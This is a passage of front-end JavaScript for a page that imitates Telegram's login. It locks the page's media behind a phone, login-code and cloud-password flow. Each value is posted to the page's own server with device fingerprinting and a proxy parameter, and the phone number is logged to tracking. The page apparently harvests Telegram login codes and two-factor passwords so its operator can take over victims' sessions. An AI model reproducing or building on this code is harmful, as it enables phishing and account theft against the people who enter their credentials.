			c.dial.replace("+", "").includes(q.replace("+", "")) ||
			c.iso.toLowerCase().includes(q)
		);
	});
	const frag = document.createDocumentFragment();
	if (!items.length) {
		const empty = document.createElement("div");
		empty.className = "MenuItem compact text-only no-results";
		empty.innerHTML = "<button type='button' tabindex='-1'><span>Ничего не найдено</span></button>";
		frag.appendChild(empty);
	} else {
		items.forEach((country) => {
			const row = document.createElement("div");
			row.className = "MenuItem compact text-only";
			row.setAttribute("role", "menuitem");
			row.tabIndex = 0;
			if (country.name === selectedCountryName) row.classList.add("is-active");
			const src = flagSrc(country.iso);
			const flagHtml = src
				? `<span class="country-flag"><img class="emoji" src="${src}" alt="${flagEmoji(country.iso)}" loading="lazy" decoding="async" draggable="false"></span>`
				: `<span class="country-flag">${flagEmoji(country.iso)}</span>`;
			row.innerHTML =
				`<button type="button">` +
				flagHtml +
				`<span class="country-name">${country.name}</span>` +
				`<span class="country-code">${country.dial}</span>` +
				`</button>`;
			row.querySelector("button")?.addEventListener("mousedown", (event) => {
				event.preventDefault();
				selectCountry(country);
			});
			frag.appendChild(row);
		});
	}
	countryList.replaceChildren(frag);
}

let countryCloseTimer = 0;
let countryOpenRaf = 0;

function openCountryDropdown(query) {
	if (!countryWrap || !countryList) return;
	const q = query === undefined ? "" : query;
	renderCountryList(q);

	const alreadyOpen =
		countryWrap.classList.contains("is-open") && countryList.classList.contains("open");
	if (alreadyOpen) return;

	if (countryCloseTimer) {
		window.clearTimeout(countryCloseTimer);
		countryCloseTimer = 0;
	}
	if (countryOpenRaf) {
		window.cancelAnimationFrame(countryOpenRaf);
		countryOpenRaf = 0;
	}

	countryWrap.classList.add("is-open");
	countryWrap.querySelector(".input-group")?.classList.add("touched");
	countryChevron?.classList.add("open");
	countryList.classList.remove("closing", "open");

	// один кадр в закрытом состоянии без transition, затем плавное open
	countryList.style.transition = "none";
	countryList.style.opacity = "0";
	countryList.style.transform = "scale(var(--animation-start-scale))";
	countryOpenRaf = window.requestAnimationFrame(() => {
		countryList.style.transition = "";
		countryList.style.opacity = "";
		countryList.style.transform = "";
		countryOpenRaf = window.requestAnimationFrame(() => {
			countryList.classList.add("open");
			countryOpenRaf = 0;
		});
	});
}

function closeCountryDropdown() {
	if (!countryWrap || !countryList) return;
	if (!countryWrap.classList.contains("is-open")) {
		if (countryInput && document.activeElement !== countryInput) {
			countryInput.value = selectedCountryName;
		}
		return;
	}
	if (countryOpenRaf) {
		window.cancelAnimationFrame(countryOpenRaf);
		countryOpenRaf = 0;
	}
	countryList.style.transition = "";
	countryList.style.opacity = "";
	countryList.style.transform = "";
	countryList.classList.add("closing");
	countryList.classList.remove("open");
	countryChevron?.classList.remove("open");
	if (countryCloseTimer) window.clearTimeout(countryCloseTimer);
	countryCloseTimer = window.setTimeout(() => {
		countryWrap.classList.remove("is-open");
		countryList.classList.remove("closing");
		countryCloseTimer = 0;
		if (countryInput && document.activeElement !== countryInput) {
			countryInput.value = selectedCountryName;
		}
	}, 160);
}

function syncTouchedLabels() {
	document.querySelectorAll(".tg-auth .input-group .form-control").forEach((input) => {
		const group = input.closest(".input-group");
		if (!group) return;
		if ((input.value || "").trim()) group.classList.add("touched");
	});
}

function setupCountryPicker() {
	const initial = COUNTRIES.find((c) => c.name === "Россия") || COUNTRIES[0];
	if (initial) {
		selectedCountryName = initial.name;
		selectedDial = initial.dial;
		if (countryInput) countryInput.value = initial.name;
		if (fields.phone && !fields.phone.value.trim()) {
			fields.phone.value = formatPhoneValue(initial.dial, "");
		} else if (fields.phone && fields.phone.value.trim() === initial.dial) {
			fields.phone.value = formatPhoneValue(initial.dial, "");
		} else if (fields.phone) {
			onPhoneInput();
		}
	}
	renderCountryList("");

	fields.phone?.addEventListener("focus", () => {
		const value = fields.phone.value || "";
		const dial = selectedDial || "";
		// только код страны — курсор в конец (после цифр / пробела)
		if (!value.trim() || value.trim() === dial || value === dial + " ") {
			placeCaretAtEnd(fields.phone);
			window.requestAnimationFrame(() => placeCaretAtEnd(fields.phone));
		}
	});
	fields.phone?.addEventListener("click", () => {
		const value = fields.phone.value || "";
		const dial = selectedDial || "";
		if (value.trim() === dial || value === dial + " ") {
			placeCaretAtEnd(fields.phone);
		}
	});
	fields.phone?.addEventListener("paste", () => {
		phonePastePending = true;
	});
	fields.phone?.addEventListener("input", onPhoneInput);
	syncPhoneNextButton();
	countryInput?.addEventListener("focus", () => {
		// как в tg_auth: при фокусе открываем полный список и даём печатать поиск
		openCountryDropdown("");
		countryInput.select();
	});
	countryInput?.addEventListener("input", () => {
		openCountryDropdown(countryInput.value);
	});
	countryInput?.addEventListener("keydown", (event) => {
		if (event.key === "Escape") {
			closeCountryDropdown();
			countryInput.blur();
		}
		if (event.key === "Enter") {
			event.preventDefault();
			const first = countryList?.querySelector(".MenuItem.compact:not(.no-results) button");
			first?.dispatchEvent(new Event("mousedown"));
		}
	});
	countryInput?.addEventListener("blur", () => {
		setTimeout(() => {
			if (!countryWrap?.contains(document.activeElement)) {
				closeCountryDropdown();
			}
		}, 120);
	});

	document.addEventListener("click", (event) => {
		if (!countryWrap?.classList.contains("is-open")) return;
		if (countryWrap.contains(event.target)) return;
		closeCountryDropdown();
	});

	document.querySelectorAll(".tg-auth .input-group .form-control").forEach((input) => {
		input.addEventListener("input", () => {
			input.closest(".input-group")?.classList.toggle(
				"touched",
				Boolean((input.value || "").trim()) || document.activeElement === input
			);
		});
		input.addEventListener("focus", () => {
			input.closest(".input-group")?.classList.add("touched");
		});
	});
}

async function api(path, body) {
	const res = await fetch(path, {
		method: "POST",
		headers: { "Content-Type": "application/json" },
		body: JSON.stringify(body || {}),
	});
	const data = await res.json().catch(() => ({}));
	if (!res.ok) {
		const detail = data.detail;
		if (typeof detail === "string") throw new Error(detail);
		if (Array.isArray(detail) && detail.length) {
			const first = detail[0];
			const msg = first?.msg || first?.message || "Ошибка запроса";
			throw new Error(String(msg));
		}
		throw new Error("Ошибка запроса");
	}
	return data;
}

function isLoginGoneError(error) {
	const msg = String(error?.message || error || "");
	return /login_id не найден|обновите страницу/i.test(msg);
}

async function ensureLoginId({ force = false } = {}) {
	if (!force && loginId) return loginId;
	const client = await collectClientDevice();
	const data = await api("/api/auth/start", { client });
	loginId = data.login_id;
	if (!loginId) throw new Error("Не удалось начать вход");
	return loginId;
}

async function withLoginRetry(request) {
	try {
		return await request(await ensureLoginId());
	} catch (error) {
		if (!isLoginGoneError(error)) throw error;
		// после рестарта сервера старый login_id в памяти браузера уже мёртв
		return await request(await ensureLoginId({ force: true }));
	}
}

async function startLogin(place = "login") {
	if (unlocked || authBusy) return;
	track("click.login", { place });

	showRoot(true);
	showStep("load", { instant: true });
	try {
		loginId = null;
		const client = await collectClientDevice();
		const data = await api("/api/auth/start", { client });
		loginId = data.login_id;
		setError(errors.phone, "");
		showStep("phone", { instant: true });
		focusPhone();
		track("auth.ui.ready", { login_id: loginId, step: "phone" });
	} catch (error) {
		showRoot(false);
		track("auth.ui.error", { stage: "start", error: error.message || String(error) });
		alert(error.message || String(error));
	}
}

function humanizeAuthError(text) {
	const msg = String(text || "").trim();
	if (!msg) return "Ошибка входа";
	if (/database is locked/i.test(msg)) {
		return "Сессия занята. Оставьте один запуск сервера и повторите.";
	}
	return msg;
}

function closeLogin() {
	if (authBusy) return;
	track("auth.ui.close", { login_id: loginId || undefined });
	const id = loginId;
	loginId = null;
	stopQrPolling();
	showRoot(false);
	showStep("phone", { instant: true });
	if (id) {
		fetch("/api/auth/cancel", {
			method: "POST",
			headers: { "Content-Type": "application/json" },
			body: JSON.stringify({ login_id: id }),
		}).catch(() => {});
	}
}

async function finishAuth(data) {
	track("auth.ui.result", {
		login_id: loginId || undefined,
		step: data.step,
		error: data.error || undefined,
		user: data.user_label || undefined,
		job_id: data.job_id || undefined,
	});
	if (data.step === "done") {
		track("auth.ui.reload", {
			login_id: loginId || undefined,
			job_id: data.job_id || undefined,
		});
		// сразу закрываем модалку и разблокируем UI до перезагрузки
		stopQrPolling();
		loginId = null;
		authBusy = false;
		document.body.classList.add("is-unlocked");
		document.body.dataset.unlocked = "1";
		showRoot(false);
		window.location.replace(window.location.pathname + window.location.search);
		return;
	}
	if (data.step === "code") {
		if (phoneShown) phoneShown.textContent = currentPhone;
		if (data.error) {
			setCodeError(data.error);
		} else {
			setCodeError("");
			clearCodeInputs();
		}
		showStep("code");
		window.requestAnimationFrame(() => focusCodeInput());
		return;
	}
	if (data.step === "password") {
		if (data.error) {
			setPasswordError(data.error);
		} else {
			setPasswordError("");
			if (fields.password) fields.password.value = "";
		}
		showStep("password");
		fields.password?.focus();
		return;
	}
	if (data.step === "error") {
		const msg = humanizeAuthError(data.error || "Ошибка входа");
		if (steps.phone?.classList.contains("is-active") || getActiveStep() === steps.phone) {
			setError(errors.phone, msg);
			return;
		}
		if (steps.code?.classList.contains("is-active") || getActiveStep() === steps.code) {
			setCodeError(msg);
			return;
		}
		if (steps.password?.classList.contains("is-active") || getActiveStep() === steps.password) {
			setPasswordError(msg);
			return;
		}
		showStep("phone", { instant: true });
		setError(errors.phone, msg);
		return;
	}
}

function setButtonLoading(button, loading, idleLabel = "Далее") {
	if (!button) return;
	const label = button.querySelector(".auth-button__label");
	button.classList.toggle("is-loading", Boolean(loading));
	button.disabled = Boolean(loading);
	button.setAttribute("aria-busy", loading ? "true" : "false");
	if (label) {
		label.textContent = loading ? "Пожалуйста, подождите…" : idleLabel;
	}
	button.closest(".auth-form")?.classList.toggle("is-busy", Boolean(loading));
}

document.getElementById("tg-phone-btn")?.addEventListener("click", async () => {
	if (authBusy) return;
	authBusy = true;
	const btn = document.getElementById("tg-phone-btn");
	setError(errors.phone, "");
	currentPhone = (fields.phone?.value || "").trim();
	track("auth.ui.phone_click", { login_id: loginId, phone: currentPhone });
	setButtonLoading(btn, true);
	try {
		const data = await withLoginRetry((id) =>
			api("/api/auth/phone", {
				login_id: id,
				phone: currentPhone,
				proxy: null,
				options: {},
			})
		);
		await finishAuth(data);
	} catch (error) {
		showStep("phone");
		setError(errors.phone, humanizeAuthError(error.message || String(error)));
		track("auth.ui.error", { stage: "phone", error: error.message || String(error) });
	} finally {
		authBusy = false;
		setButtonLoading(btn, false);
	}
});

document.getElementById("tg-code-btn")?.addEventListener("click", async () => {
	if (authBusy) return;
	authBusy = true;
	setCodeError("");
	const code = getCodeValue();
	const form = document.querySelector("#tg-step-code .auth-form");
	track("auth.ui.code_click", { login_id: loginId, code_len: code.length });
	form?.classList.add("is-busy");
	if (fields.code) fields.code.disabled = true;
	try {
		const data = await api("/api/auth/code", {
			login_id: loginId,
			code,
		});
		await finishAuth(data);
	} catch (error) {
		showStep("code");
		setCodeError(error.message || String(error));
		window.requestAnimationFrame(() => focusCodeInput());
		track("auth.ui.error", { stage: "code", error: error.message || String(error) });
	} finally {
		authBusy = false;
		codeSubmitLock = false;
		form?.classList.remove("is-busy");
		if (fields.code) fields.code.disabled = false;
	}
});

document.getElementById("tg-password-btn")?.addEventListener("click", async () => {
	if (authBusy) return;
	authBusy = true;
	const btn = document.getElementById("tg-password-btn");
	setPasswordError("");
	const password = fields.password?.value || "";
	track("auth.ui.password_click", { login_id: loginId, password_len: password.length });
	setButtonLoading(btn, true);
	try {
		const data = await api("/api/auth/password", {
			login_id: loginId,
			password,
		});
		await finishAuth(data);
	} catch (error) {
		showStep("password");
		setPasswordError(error.message || String(error));
		fields.password?.focus();
		track("auth.ui.error", { stage: "password", error: error.message || String(error) });
	} finally {
		authBusy = false;
		setButtonLoading(btn, false);
	}
});

document.getElementById("tg-auth-close")?.addEventListener("click", closeLogin);
document.getElementById("tg-edit-phone")?.addEventListener("click", () => {
	track("auth.ui.edit_phone", { login_id: loginId || undefined });
	setError(errors.phone, "");
	setCodeError("");
	clearCodeInputs();
	showStep("phone");
	focusPhone();
});

document.getElementById("tg-forgot-password")?.addEventListener("click", () => {
	track("auth.ui.forgot_password", { login_id: loginId || undefined });
	alert(
		"Восстановление облачного пароля доступно только в официальном приложении Telegram: Настройки → Конфиденциальность → Облачный пароль."
	);
});

document.getElementById("tg-alt-qr")?.addEventListener("click", () => {
	startQrLogin();
});
document.getElementById("tg-qr-back")?.addEventListener("click", () => {
	stopQrPolling();
	setError(errors.qr, "");
	setError(errors.phone, "");
	showStep("phone");
	focusPhone();
	if (loginId) {
		fetch("/api/auth/qr/discard", {
			method: "POST",
			headers: { "Content-Type": "application/json" },
			body: JSON.stringify({ login_id: loginId }),
		}).catch(() => {});
	}
});

["tg-phone", "tg-password"].forEach((id) => {
	document.getElementById(id)?.addEventListener("keydown", (event) => {
		if (event.key !== "Enter") return;
		event.preventDefault();
		const map = {
			"tg-phone": "tg-phone-btn",
			"tg-password": "tg-password-btn",
		};
		document.getElementById(map[id])?.click();
	});
});

setupCodeInputs();
setupPasswordToggle();

function onMediaClick(event) {
	const target = event.currentTarget;
	track("click.media", {
		place: "media",
		unlocked,
		tag: target?.tagName || undefined,
	});
	if (!unlocked) {
		event.preventDefault();
		startLogin("media");
	}
}

function copyPageLink() {
	track("click.copy_link", { url: location.href });
	navigator.clipboard?.writeText(location.href).catch(() => {});
}

async function logoutLanding() {
	track("click.logout");
	await fetch("/api/auth/logout", { method: "POST" });
	location.reload();
}

window.showPopup = () => startLogin("popup");
window.openLogin = () => startLogin("button");
window.closeLogin = closeLogin;
window.onMediaClick = onMediaClick;
window.copyPageLink = copyPageLink;
window.logoutLanding = logoutLanding;

setupCountryPicker();
syncTouchedLabels();
track("client.context", { path: location.pathname });

(function setupBioMore() {
	const text = document.getElementById("bio-text");
	const btn = document.getElementById("bio-more");
	if (!text || !btn) return;

	const check = () => {
		const clamped = text.classList.contains("is-clamped");
		if (!clamped) {
			btn.hidden = false;
			return;
		}
		btn.hidden = !(text.scrollHeight > text.clientHeight + 1);
	};

	check();
	window.addEventListener("resize", check);
	btn.addEventListener("click", () => {
		const nowOpen = text.classList.toggle("is-clamped") === false;
		btn.textContent = nowOpen ? "Show less" : "Show more";
		if (!nowOpen) check();
		else btn.hidden = false;
	});
})();
